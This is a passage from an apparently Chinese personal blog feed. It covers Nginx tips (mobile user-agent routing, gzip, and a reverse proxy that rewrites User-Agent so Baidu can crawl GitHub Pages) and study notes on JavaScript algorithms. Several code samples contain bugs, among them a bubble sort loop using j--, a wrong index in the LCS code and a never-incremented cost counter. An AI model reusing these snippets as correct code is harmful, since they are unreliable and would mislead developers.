/usr/share/nginx/pc; if ($http_user_agent ~* '(Android|webOS|iPhone|iPod|BlackBerry)') &#123; root /usr/share/nginx/mobile; &#125; index index.html; &#125;&#125; 这里要注意 if 与后面的括号要有至少一个空格的距离，如果紧贴的话会报错。 接着重启服务器 1nginx -s reload 接着在浏览器打开ip地址的8001端口，可以看到 接着 f12，切换移动端模式，进行刷新，可以看到 上面的适配是没有写完整的，具体的可以点击这里，里面会有不同服务器完整的判断端。 Nginx的Gzip压缩配置Gzip是网页的一种网页压缩技术，经过gzip压缩后，页面大小可以变为原来的30%甚至更小。更小的网页会让用户浏览的体验更好，速度更快。gzip网页压缩的实现需要浏览器和服务器的支持。 当浏览器支持gzip压缩时，会在请求消息中包含 Accept-Encoding:gzip，这样Nginx就会向浏览器发送经过gzip压缩的内容，同时在相应的信息头加入 Content-Encoding:gzip,声明这是gzip后的内容，浏览器需要先解压才可以解析解出。 gzip网站压缩检测 可以首先检测我的服务器ip 可以看到是没有开启gzip的。 gzip的配置项Nginx 提供了专门的gzip模块。 gzip:该指令用于开启或者关闭gzip指令 gzip_static:Nginx对于静态文件的处理模块,该模块可以读取预先压缩的gz文件，这样可以减少每次请求进行gzip压缩的CPU资源消耗,on|off gzip_buffers:设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流 gzip_comp_level:gzip压缩比，压缩级别是1-9,1的级别最低，9的压缩级别最高。压缩时间也随着增长 gzip_disable:可以通过该指令对一些特定的 User-Agent不使用压缩功能。 gzip_min_length:设置运行压缩的页面最小字数，页面字节数从相应消息头 Content-length 中进行获取 gzip_http_version:识别HTTP协议版本，1.1或1.0 gzip_proxied:用于设置启动或禁用从代理服务器上收到相应内容gzip压缩 gzip_vary:用于在响应消息头中添加 Vary:Accept-Encoding，是代理服务器根据请求头中的 Accept-Encoding 识别是否启动 gzip压缩。 gzip简单配置etc/nginx/nginx.conf 123456http &#123; ..... gzip on; gzip_types text/plain application/javascript text/css; .....&#125; 上面是检测工具的结果，打开网站按 F12, 查看网站资源。 可以清楚的看见Content-Encoding为gzip类型。我们就成功的开启了gzip。 这个压缩的配置需要自己摸索，才可以知道最佳的压缩度。另外也并不是什么东西都需要压缩可以得到更小的文件。有些本来就很小的文件压缩后反而会变得比原来的大。另外图片注意不要启用gzip压缩 应用之反向代理百度爬虫支持 Github Pages 收录百度爬取 github 给 403 的主要依据是 user agent，在 Nginx 中直接对 user agent 进行伪造 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061server &#123; listen 80; server_name laibh.top; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; # location / &#123; # root /usr/share/nginx/html; # index index.html index.htm; # &#125; location / &#123; proxy_pass http://LbhFront-end.github.io; #替换成自己的 github pages 主页 proxy_redirect off; proxy_set_header User-Agent "Mozilla/5.0"; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; location ~* \.(xml|html|htm)$ &#123; proxy_pass http://LbhFront-end.github.io; #替换成自己的 github pages 主页 proxy_redirect off; proxy_set_header User-Agent "Mozilla/5.0"; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; 百度抓取诊断记录一片绿，直接起飞]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第十二章）—— 算法复杂度]]></title>
    <url>%2F2018-11-12-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part12.html</url>
    <content type="text"><![CDATA[花了一个星期，终于看到这本书的最后一章了。这章将要学习著名的大O表示法。 第十二章 算法复杂度大O表示法它用于描述算法的性能和复杂程度 分析算法时，时常遇到以下几类函数 符号 名称 O(1) 常数的 O(log(n)) 对数的 O((log(n)c)) 对数多项式的 O(n) 线性的 O(n2) 二次的 O(nc) 多项式的 O(cn) 指数的 理解大O表示法如何衡量算法的效率？通常是用资源，例如CPU（时间）占用、内存占用、硬盘占用和网络占用。当讨论大O表示法时，一般考虑的是CPU（时间）占用。 让我们试着用一些例子来理解大O表示法的规则 O(1)123function increment(num)&#123; return ++num;&#125; 假设运行increment（1）函数，执行时间等于 X。如果再用不同的参数运行一次increment函数，执行事件依然是 X。和参数无关，increment函数的性能都一样。因此，我们说上述函数的复杂程度是O(1)（常数） O(n)12345678function sequentialSearch(array,item)&#123; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; return -1;&#125; 如果将含有10个元素的数组（[1,…,10]）传递给该函数，例如搜索1这个元素，那么第一次判断时就能找到想要搜索的元素。在这里我们假设每执行一次（item === array[i]）开销为1. 现在，假如要搜索元素11.那么函数会执行10次（遍历数组中所有的值，并且找不到要搜索的元素，因此结果返回-1），那么开销就是10。以此类推，sequentialSearch 函数执行的总开销取决了数组元素的个数（数组的大小）。可以得到sequentialSearch函数的时间复杂度为O(n)，n是（输入）数组的大小。 回到之前的例子，修改一下算法的实现。 12345678910function sequentialSearch(array,item)&#123; var cost = 0; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; console.log('cost for sequentialSearch with inpy size ' + array.length + 'is' + cost); return -1;&#125; 用不同大小输入数组执行以上算法，可以看到不同的输出。 O(n2)用冒泡排序做例子 1234567891011121314151617181920function swap(array, index1, index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux;&#125;function bubbleSort(array)&#123; var length = array.length, cost = 0; for(var i = 0; i &lt; length; i++)&#123; cost++; for(var j = 0; j &lt; length; j++)&#123; cost++; if(array[j] &gt; array[j+1])&#123; swap(array, j, j+1); &#125; &#125; &#125; console.log('cost for bubbleSort with input size' + length + 'is' + cost);&#125; 如果用大小为10的数组执行上面的函数，开销是100（102）。 时间复杂度O(n)的代码只有一层循环，而O(n2)有两层循环。如果算法有三层遍历数组的嵌套循环，它的时间复杂度很有可能是O(n3) 时间复杂度比较下面比较了前述各个大O符号表示的时间复杂度 数据结构 下表是常用数据结构的时间复杂度 数据结构 一般情况 最差情况 插入 删除 搜索 插入 删除 搜索 数组-栈-队列 O(1) O(1) O(n) O(1) O(1) O(n) 链表 O(1) O(1) O(n) O(1) O(1) O(n) 双向链表 O(1) O(1) O(n) O(1) O(1) O(n) 散列表 O(1) O(1) O(1) O(n) O(n) O(n) 二分搜索树 O(log(n)) O(log(n)) O(log(n)) O(n) O(n) O(n) AVL树 O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) 图 下表是图的时间复杂度 节点-边的管理方式 存储空间 增加顶点 增加边 删除顶点 删除边 轮询 邻接表 O(V+E) O(1) O(1) O(V+E) O(E) O(V) 邻接矩阵 O(V2) O(V2) O(1) O(V2) O(1) O(1) 排序算法 下表是排序算法的时间复杂度 算法（用于数组） 最好情况 一般情况 最差情况 冒泡排序 O(n) O(n2) O(n2) 选择排序 O(n2) O(n2) O(n2) 插入排序 O(n) O(n2) O(n2) 归并排序 O(nlog(n)) O(nlog(n)) O(nlog(n)) 快速排序 O(nlog(n)) O(nlog(n)) O(n2) 堆排序 O(nlog(n)) O(nlog(n)) O(nlog(n)) 桶排序 O(n+k) O(n+k) O(n2) 基数排序 O(nk) O(nk) O(nk) 搜索算法 下表是搜索算法的时间复杂度 算法 数据结构 最差情况 顺序搜索 数组 O(n) 二分搜索 已排序的数组 O(log(n)) 深度优先搜索（DPS） 顶点数为V，边数为E的图 O(V+E) 广度优先搜索（BFS） 顶点数为V，边数为E的图 O(V+E) NP完全理论概述一般来说，如果一个算法的复杂度为 O(nk)，其中k是常数，我们就认为这个算法是最高效的，这就是多项式算法。 对于给定的问题，如果存在多项式算法，则计为P（polynomial,多项式）。 还有一类NP（nondeterministic polynomial,非确定性多项式）算法。如果一个问题可以在多项式时间内验证是否正确，则计为NP。 如果一个问题存在多项式算法，自然可以在多项式时间内验证其解。因此，所有P都是NP。然而，P = NP 是否成立，仍然不得而知。 小结我们学习了大O表示法，已经如何运算它计算算法的复杂度。也粗略介绍了NP的一些理论。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第十一章）—— 算法模式]]></title>
    <url>%2F2018-11-08-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part11.html</url>
    <content type="text"><![CDATA[本章将会学习递归、动态规划和贪心算法。 第十一章 算法模式递归递归是一种解决问题的方法，它解决问题的各个小部分，直到解决最初的大问题。递归通常涉及函数调用自身。 递归函数是像下面能够直接调用自身的方式或函数 123function recursiveFunction(someParam)&#123; recursiveFunction(someParam);&#125; 能够像下面这样间接调用自身的函数，也是递归函数 123456function recursiveFunction1(someParam)&#123; recursiveFunction2(someParam);&#125;function recursiveFunction2(someParam)&#123; recursiveFunction1(someParam);&#125; 假设现在必须要执行 recursiveFunction ,结果是什么?单单上述情况而言，它会一直执行下去。因此，每个递归函数都必须有边界条件，即一个不再递归调用的条件（停止点），以防无限递归。 JavaScript 调用栈大小的限制如果忘记加上用以停止函数递归调用的边界条件，会发生什么呢？递归并不会无限执行下去，浏览器会抛出错误，也就是所谓的栈溢出错误（stack Overflow error） 每个浏览器都有自己的上限，可以用一下代码测试。 12345678910111213var i = 0;function recursiveFn()&#123; i++; recursiveFn();&#125;try&#123; recursiveFn(); &#125;catch(e)&#123; console.log('i='+i+' error:'+e);&#125;// 谷歌：i=15706 error:RangeError: Maximum call stack size exceeded// 360：i=31470 error:RangeError: Maximum call stack size exceeded// 火狐：i=40687 error:InternalError: too much recursion 根据操作系统和浏览器的不同，具体的数值也会有所不同，但区别不大。 ES6 有尾调用优化（tail call optimazation）。如果函数内最后一个操作是调用函数，会通过“跳转指令（jump）”而不是“子程序调用（subroutine call ）”来控制。也就是说，ES6中，这里的代码会一直执行下去。所以，具有停止递归的边界条件很重要。 尾调用 点击看看，阮一峰老师的。 斐波那契数列斐波那契数列的定义如下： 1 和 2 的斐波那契数是1 n（n&gt;2）的斐波那契数是（n-1）加上（n-2）的斐波那契数。 实现 123456function fibonacci(num)&#123; if(num === 1 || num ===2)&#123; return 1; &#125; return arguments.callee(num - 1) + arguments.callee(num - 2);&#125; 让我们试着找出6的斐波那契数，其会产生如下函数调用 我们也可以用非递归的方法实现 1234567891011function fib(num)&#123; var n1 = 1, n2 = 1, n = 1; for(var i = 3; i &lt;= num; i++)&#123; n = n1 + n2; n1 = n2; n2 = n; &#125; return n;&#125; 为什么要用递归？是因为更快吗？其实并不，反而更慢。递归的好处在于更容易理解，并且它所需的代码量更少。然后在ES6中，因为有尾调用，可以加快递归的速度。总而言之，我们用递归，通常是因为它更容易解决问题。 动态规划动态规划（Dynamic Programming,DP）是一种将复杂问题分解成更小的子问题来解决的优化技术。与分而治之不同的是，动态规划是将问题分解成相互依赖的子问题。 用动态规划解决问题，要遵循三个步骤： 实现子问题。 实现要反复执行来解决子问题的部分 识别并求解出边界条件 可以用动态规划解决一些著名的问题如下： 背包问题：给出一组项目，各自有值和容量，目标是要找出总值最大的项目的集合。这个问题的限制是，总容量必须小于等于“背包”的容量。 最长公共子序列：找出一组序列的最长公共子序列（可由另一序列删除元素但不改变） 矩阵链相乘：给出一系列矩阵，目标是找到这些矩阵相乘的最高效办法（计算次数尽可能少）。相乘操作不会进行，解决方案是找到这些矩阵各自相乘的顺序。 硬币找零：给出面额为d1…dn的一定数量的硬币和要找零的钱数，找出有多少种找零的方法。 图的全源最短路径：对所有顶点对（u,v），找出顶点u到顶点v的最短路径。 最少硬币找零问题最少硬币找零问题是硬币问题的一个变种。硬币找零问题是给出要找零的钱数，以及可以用的硬币面额d1…dn 及其数量，找出有多少种找零方法。最少硬币找零问题是要给出要找零的钱数以及可用的硬币面额d1…dn及其数量，找出所需的最少硬币个数。 例如，美国有一下面额（硬币）：d1=1,d2=5,d3=10,d4=25 如果要找36美分的零钱，我么可以用1个25美分，1个10美分和一个便士（1美分） 如何将这个解答转化成算法？ 最少硬币找零的解决方案是找到n所需的最小硬币数。但要做到这一点，首先得找到对每个x&lt;n的解。然后，我们将解建立在更小的值的基础上。 1234567891011121314151617181920212223242526272829function MinCoinChange(coins)&#123; var coins = coins; // 零钱的面额 var cache = &#123;&#125;; // 缓存 this.makeChange = function(amount)&#123; // 递归函数 var me = this; if(!amount)&#123; // 若金额总额小于0则返回空数组 return []; &#125; if(cache[amount])&#123; // 若缓存中已有该计算结果，则直接返回 return cache[amount]; &#125; var min = [],newMin,newAmount; for(var i = 0; i &lt; coins.length; i++)&#123; var coin = coins[i]; newAmount = amount - coin; if(newAmount &gt;= 0)&#123; newMin = me.makeChange(newAmount); &#125; if(newAmount &gt;= 0 &amp;&amp; (newMin.length &lt; min.length - 1 || !min.length) &amp;&amp; (newMin.length || !newAmount))&#123; min = [coin].concat(newMin); console.log('new Min '+ min + 'for '+ amount); &#125; &#125; return (cache[amount] = min); &#125; this.getCache = function()&#123; console.log(cache); &#125;&#125; 测试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566const minCoinChange = new MinCoinChange([1,5,10,25]);console.log(minCoinChange.makeChange(36));/*new Min 1,1,1,1,1for 5new Min 5for 5new Min 1,5for 6new Min 1,1,5for 7new Min 1,1,1,5for 8new Min 1,1,1,1,5for 9new Min 1,1,1,1,1,5for 10new Min 5,5for 10new Min 10for 10new Min 1,10for 11new Min 1,1,10for 12new Min 1,1,1,10for 13new Min 1,1,1,1,10for 14new Min 1,1,1,1,1,10for 15new Min 5,10for 15new Min 1,5,10for 16new Min 1,1,5,10for 17new Min 1,1,1,5,10for 18new Min 1,1,1,1,5,10for 19new Min 1,1,1,1,1,5,10for 20new Min 5,5,10for 20new Min 10,10for 20new Min 1,10,10for 21new Min 1,1,10,10for 22new Min 1,1,1,10,10for 23new Min 1,1,1,1,10,10for 24new Min 1,1,1,1,1,10,10for 25new Min 5,10,10for 25new Min 25for 25new Min 1,25for 26new Min 1,1,25for 27new Min 1,1,1,25for 28new Min 1,1,1,1,25for 29new Min 1,1,1,1,1,25for 30new Min 5,25for 30new Min 1,5,25for 31new Min 1,1,5,25for 32new Min 1,1,1,5,25for 33new Min 1,1,1,1,5,25for 34new Min 1,1,1,1,1,5,25for 35new Min 5,5,25for 35new Min 10,25for 35new Min 1,10,25for 36 (3) [1, 10, 25]*/minCoinChange.getCache(); // &#123;1: Array(1), 2: Array(2), 3: Array(3), 4: Array(4), 5: Array(1), 6: Array(2), 7: Array(3), 8: Array(4), 9: Array(5), 10: Array(1), 11: Array(2), 12: Array(3), 13: Array(4), 14: Array(5), 15: Array(2), 16: Array(3), 17: Array(4), 18: Array(5), 19: Array(6), 20: Array(2), 21: Array(3), 22: Array(4), 23: Array(5), 24: Array(6), 25: Array(1), 26: Array(2), 27: Array(3), 28: Array(4), 29: Array(5), 30: Array(2), 31: Array(3), 32: Array(4), 33: Array(5), 34: Array(6), 35: Array(2), 36: Array(3)&#125;const minCoinChange1 = new MinCoinChange([1,3,4]);console.log(minCoinChange1.makeChange(6));/* new Min 1for 1 new Min 1,1for 2 new Min 1,1,1for 3 new Min 3for 3 new Min 1,3for 4 new Min 4for 4 new Min 1,4for 5 new Min 1,1,4for 6 new Min 3,3for 6 (2) [3, 3]*/minCoinChange1.getCache(); // &#123;1: Array(1), 2: Array(2), 3: Array(1), 4: Array(1), 5: Array(2), 6: Array(2)&#125; 背包问题背包问题是一个组合优化问题。它可以描述如下：给定一个固定大小、能够携带W的背包，以及一组有价值和重量的物品，找出一个最佳解决方案，使得装入背包的物品总重量不超过W，且总价值最大。 下面是一个例子： 物品 重量 价值 1 2 3 2 3 4 3 4 5 考虑背包能够携带的重量只有5。对于这个例子，我们可以说最佳解决方案就是往背包里装入物品1和物品2，这样，总重量为5，总价值为7。 背包算法： 1234567891011121314151617181920function knapSack(capacity,weights,values,n)&#123; var i,w,a,b,kS = []; for(i = 0; i &lt;= n; i++)&#123; kS[i] = []; &#125; for(i = 0; i &lt;= n; i++)&#123; for(w = 0; w &lt;= capacity; w++)&#123; if(i == 0 || w == 0)&#123; kS[i][w] = 0; &#125;else if(weights[i-1] &lt;= w)&#123; a = values[i - 1] + kS[i - 1][w - weights[i-1]]; b = kS[i-1][w]; kS[i][w] = (a &gt; b) ? a : b; &#125;else&#123; kS[i][w] = kS[i-1][w]; &#125; &#125; &#125; return kS[n][capacity];&#125; 工作原理 首先，初始化将用于寻找解决方案的矩阵ks[n+1][capacity+1] 忽略矩阵的第一列和第一行，只处理索引不为0的列和行 物品i的重量必须小于约束（capacity）才有可能成为解决方案的一部分。否则，总重量就会超出背包能够携带的重量。发生这种情况的话，就采用之前的值。 当找到可以构成解决方案的物品时，选择价值最大的那个 问题的解决方案就在二维表格右下角的最后一个格子里面 测试 12345var values = [3,4,5],weights = [2,3,4],capacity = 5,n = values.length;console.log(knapSack(capacity,weights,values,n)); // 7 上面的算法只输出背包携带物品价值的最大值，而不列出实际的物品。我们可以增加下面的附加函数来找出构成解决方案的物品： 12345678910111213function findValues(n,capacity,kS,weights,values)&#123; var i = n, k = capacity; console.log('解决方案包含以下物品： '); while( i &gt; 0 &amp;&amp; k &gt; 0 )&#123; if(kS[i][k] !== kS[i-1][k])&#123; console.log('物品' + i + '，重量：' + weights[i-1] + '，价值：'+values[i - 1] ); i--; k = k - kS[i][k]; &#125;else&#123; i--; &#125; &#125;&#125; 输出结果： 123解决方案包含以下物品： 物品2，重量：3，价值：4物品1，重量：2，价值：3 最长公共子序列另一个经常被当做编程挑战问题的动态最长公共子序列（LCS）:找出两个字符串序列的最长子序列的长度。最长子序列是指，在两个字符串序列中以相同顺序出现，但不要求连续（非字符串子串）的字符串序列。 考虑如下的例子： 字符串 元素 字符串1 a c b a e d 字符串2 a b c a d f LCS:长度为4的‘’acad“ 下面的算法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function lcs(wordX,wordY)&#123; var m = wordX.length, n = wordY.length, l = [], solution = [], i, j, a, b; for(i = 0; i &lt;= m; ++i)&#123; l[i] = []; solution[i] = []; for(j = 0; j &lt;= n; ++j)&#123; l[i][j] = 0; solution[i][j] = '0'; &#125; &#125; for(i = 0; i &lt;= m; i++)&#123; for(j = 0; j &lt;= n; j++)&#123; if(i == 0 || j == 0)&#123; l[i][j] = 0; &#125;else if(wordX[i-1] == wordY[j-1])&#123; l[i][j] = l[i-1][j-1] + 1; solution[i][j] = 'diagonal'; &#125;else&#123; a = l[i-1][i]; b = l[i][j-1]; l[i][j] = a &gt; b ? a : b; solution[i][j] = l[i][j] == l[i-1][j] ? 'top' : 'left'; &#125; &#125; &#125; printSolution(solution,l,wordX,wordY,m,n); return l[m][n];&#125;function printSolution(solution,l,wordX,wordY,m,n)&#123; var a = m, b = n, i, j, x = solution[a][b], answer = ''; while(x !== '0')&#123; if(solution[a][b] === 'diagonal')&#123; answer = wordX[a-1] + answer; a--; b--; &#125;else if(solution[a][b] === 'left')&#123; b--; &#125;else if(solution[a][b] === 'top')&#123; a--; &#125; x = solution[a][b]; &#125; console.log('lcs:' + answer);&#125; 矩阵链相乘（未完成）贪心算法（未完成）最少硬币找零问题 背包问题 函数式编程简介借助ES6的能力，JavaScript 也能够进行函数式编程 函数式编程和命令式编程以函数式方式进行开发并不简单。 假如我们想打印一个数组中所有的元素。我们可以用命令式编程，声明的函数如下: 123456var printArray = function(array)&#123; for(var i = 0; i &lt; array.length; i++)&#123; console.log(array[i]); &#125;&#125;printArray([1,2,3,4,5]); 在上面的代码中，我们迭代数组，打印每一项。 现在，我们试着将这个例子转换成函数式编程。在函数式编程中，我们关注的重点是需要描述什么，而不是如何描述 12345var forEach = function(array,action)&#123; for(var i = 0; i &lt; array.length; i++)&#123; action(array[i]); &#125;&#125; 接着我们需要创建另一个元素负责把数组元素打印到控制台的函数（考虑为回调函数），如下 123var logItem = function(item)&#123; console.log(item);&#125; 最后，像下面这样使用函数 1forEach([1,2,3,4,5],logItem); 几点需要注意： 主要目标是描述数据，已经要对数据应用的转换 程序执行顺序的重要性很低，而在命令式编程中，步骤和顺序是非常重要的 函数和数据结合是函数式编程的核心 在函数式编程中，我们可以使用和滥用函数和递归，而在命令式编程中，则使用循环、赋值、条件和函数。 另外一个例子，考虑我们要找数组中最小的值。用命令式编程完成这个任务，只要迭代数组，检查当前的最小值是否大于数组元素，如果是，就更行最小值。 12345678910var findMinArray = function(array)&#123; var minValue = array[0]; for(var i = 1; i &lt; array.length; i++)&#123; if(minValue &gt; array[i])&#123; minValue = array[i]; &#125; &#125; return minValue;&#125;console.log(findMinArray([8,6,4,5,9])); // 4 用函数式编程完成相同的任务，可以使用Math.in 函数，传入所有要比较的数组元素。我们可以像下面的例子里这样，使用ES2015 的解构操作符（…）,把数组转换成单个元素： 1234const min_ = function(array)&#123; return Math.min(...array);&#125;console.log(min_([8,6,4,5,9])); // 4 使用箭头函数，简化代码 1const min_ = arr =&gt; Math.min(...arr); JavaScript函数式工具箱——map、filter 和 reducemap、filter和reduce函数是函数式编程的基础 我们可以使用map函数 ，把一个数据集合转换成映射成另一个数据集合。先看一个命令式编程的例子： 123456789var daysOfWeek = [ &#123; name: 'Monday', value: 1 &#125;, &#123; name: 'Tuseday', value: 2 &#125;, &#123; name: 'Webnesday', value: 7 &#125;,]var daysOfWeekValues_ = [];for(var i = 0; i &lt; daysOfWeek.length; i++ )&#123; daysOfWeekValues_.push(daysOfWeek[i].value);&#125; 再以函数式编程来考虑同样的例子，代码如下： 1234var daysOfWeekValues = daysOfWeek.map(function(day)&#123; return day.value;&#125;)console.log(daysOfWeekValues); 我们可以使用 filter 函数过滤一个集合的值。来看一个例子 12345678910var positiveNumbers_ = function(array)&#123; var positive = []; for(var i = 0; i &lt; array.length; i++)&#123; if(array[i] &gt;= 0)&#123; positive.push(array[i]); &#125; &#125; return positive;&#125;console.log(positiveNumbers_([-1,1,2,-2])); // (2) [1, 2] 改成函数式 123456var positiveNumbers = function(array)&#123; return array.filter(function(num)&#123; return num &gt;= 0; &#125;);&#125;console.log(positiveNumbers([-1,1,2,-2])); // (2) [1, 2] 也可以使用reduce函数，把一个集合归纳成一个约定的值。比如，对一个数组中的值求和： 12345678var sumValues = function(array)&#123; var total = array[0]; for(var i = 1; i &lt; array.length; i++)&#123; total += array[i]; &#125; return total;&#125;console.log(sumValues([1,2,3,4,5])); // 15 上面的代码也可以写成这样的： 123456var sum_ = function(array)&#123; return array.reduce(function(a,b)&#123; return a + b; &#125;);&#125;console.log(sum_([1,2,3,4,5])); // 15 再看另外一个例子，考虑我们需要写一个函数，把几个数组连接起来。为此，可以创建另外一个数组，用于存放其他数组的元素。我们可以执行以下命令式的代码 123456789101112var mergeArrays = function(arrays)&#123; var count = arrays.length, newArray = [], k = 0; for(var i = 0; i &lt; count; i++)&#123; for(var j = 0; j &lt; arrays[i].length; j++)&#123; newArray[k++] = arrays[i][j]; &#125; &#125; return newArray;&#125;console.log(mergeArrays([[1,2,3],[4,5],[6]])); // (6) [1, 2, 3, 4, 5, 6] 在这个例子，我们声明了变量，还使用了循环。现在，我们用JavaScript 函数式编程把上面的代码重写如下： 123456var mergeArraysConcat = function(arrays)&#123; return arrays.reduce(function(p,n)&#123; return p.concat(n); &#125;);&#125;console.log(mergeArraysConcat([[1,2,3],[4,5],[6]])); // (6) [1, 2, 3, 4, 5, 6] 箭头函数简写 12const mergeArrays = (...arrays) =&gt; [].concat(...arrays);console.log(mergeArrays([1,2,3],[4,5],[6])); // (6) [1, 2, 3, 4, 5, 6] 小结在本章中，你了解了更多的递归的知识，已经它帮助我们解决一些动态规划问题。我们介绍了最著名的动态规划问题，如最少硬币找零、背包问题、最长公共子序列和矩阵链相乘(后面补)。 还学习了贪心算法，已经如何用贪心算法解决最少硬币找零和背包问题。 还学习了函数式编程，并通过一些例子了解了如何以这种范式使用JavaScript 的功能。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第十章）—— 排序和搜索算法]]></title>
    <url>%2F2018-11-07-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part10.html</url>
    <content type="text"><![CDATA[本章将会学习最常见的排序和搜索算法，如冒泡排序、选择排序、插入排序、归并排序、快速排序和堆排序，以及顺序排序和二叉搜索算法。 第十章 排序和搜索算法排序算法我们会从一个最慢的开始，接着是一些性能好一些的方法 先创建一个数组（列表）来表示待排序和搜索的数据结构。 123456789function ArrayList()&#123; var array = []; this.insert = function(item)&#123; array.push(item); &#125; this.toString = function()&#123; return array.join(); &#125;&#125; ArrayList 是一个简单的数据结构，它将项存储在数组。我们只需要一个插入方法来向数据结构中添加元素。使用js原生的push方法即可，而改写toString函数运用了js的join方法是来拼接数组中的所有元素至一个单一的字符串。 冒泡排序冒泡排序是所有排序算法中最简单，然后从运行时间看，它也是最差的一个、 冒泡排序比较两个相邻的项，如果第一个大于第二个，则交换它们。元素项向上移动至正确的顺序，就好像气泡升至表面一样，冒泡排序因此得名。 1234567891011// 冒泡排序this.bubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length -1; j--)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125;&#125; 首先，声明一个 名为length的变量，用来存储数组的长度。接着外循环从数组的第一位迭代到最后一位，它控制了在数组中经过多次轮排序，然后内循环将从第一位迭代到倒数第二位，内循环实际上进行当前项和下一项的比较。如果这两项顺序不对，则交换它们，意思就是位置为 j+1 的会被换到位置 j 处。 声明 swap函数 123456this.swap = function(index1,index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux;// [array[index1],array[index2]] = [array[index2],array[index1]]&#125; 交换时，我们用一个中间值来存储某一交换项的值。其他排序法也会用到这个方法，因此我们声明一个方法放置这段交换代码以便重用。 还可以简化成 1[array[index1],array[index2]] = [array[index2],array[index1]] 下面这个示意图展示了冒泡排序的工作过程 上面的图每一小段表示外循环的一轮，而相邻两项的比较是在内循环中进行的。 用下面的代码来测试冒泡排序算法 123456789101112function createNonSortedArray(size)&#123; var array = new ArrayList(); for(var i = size; i &gt; 0; i--)&#123; array.insert(i); &#125; return array;&#125;var array = createNonSortedArray(5);console.log(array.toString()); // 5,4,3,2,1array.bubbleSort();console.log(array.toString()); // 1,2,3,4,5 为了辅助本章将要学习的排序算法，我们将创建一个函数来自动地创建一个未排序的数组，数组的长度由函数的参数指定。如果传递5为参数，该函数就会创建如下数组 [5,4,3,2,1] 调用这个函数并将返回值存储在一个变量中，该变量将包含这个以某些数字来初始化的 ArrayList 类实例。 注意当算法执行外循环的第二轮的时候，数字4和5已经是正确排序的了。但是在后续的比较中，它们还是在一直进行着比较，即使这是不必要的。因此我们稍微改进一下。 改进版冒泡排序 1234567891011// 改进后的冒泡排序this.modifiedBubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length-1-i; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125;&#125; 下图展示了改进后的冒泡排序算法是如何执行的： 可以通过检验知道减少了10次循环，优化了算法的性能。 即使做了这样子的改变，还是不推荐该算法，该算法的复杂度是O(n2 ) 后面的章节会介绍大O表达法。 选择排序选择排序算法是一种原址比较排序算法。选择排序大致的思路是找到数据结构中最小值并将其放置在第一位，接着找到第二小的值并将其放在第二位。以此类推。 实现： 12345678910111213141516// 选择排序this.selectionSort = function()&#123; var length = array.length, indexMin; for(var i = 0; i &lt; length; i++)&#123; indexMin = i; for(var j = i; j &lt; length; j++)&#123; if(array[indexMin] &gt; array[j])&#123; indexMin = j; &#125; &#125; if(i !== indexMin)&#123; this.swap(i,indexMin); &#125; &#125;&#125; 首先声明一些将在算法内使用的变量。接着，外循环迭代数组，并控制迭代一次（数组的第n个值——下一个最小值）。我们假设本迭代一次的第一个值为数组的最小值。然后，当前 i 的值开始至数组结束，我们比较是否位置 j的值比当前的最小值小。如果是则改变最小值为新的最小值。当内循环结束，将得出数组的第n小的值。最后，如果该最小值和原最小值不一样，则交互其值。 测试： 1234var array = createNonSortedArray(5);console.log(array.toString()); // 1,2,3,4,5array.selectionSort();console.log(array.toString()); // 1,2,3,4,5 下图的示意图展示了选择排序算法，此例基于之前的代码中所用的数组。 数组底部的箭头指示出了当前迭代寻找最小值的数组范围，示意图中的每一步则表示外部循环。 选择排序同样是一个复杂度也是 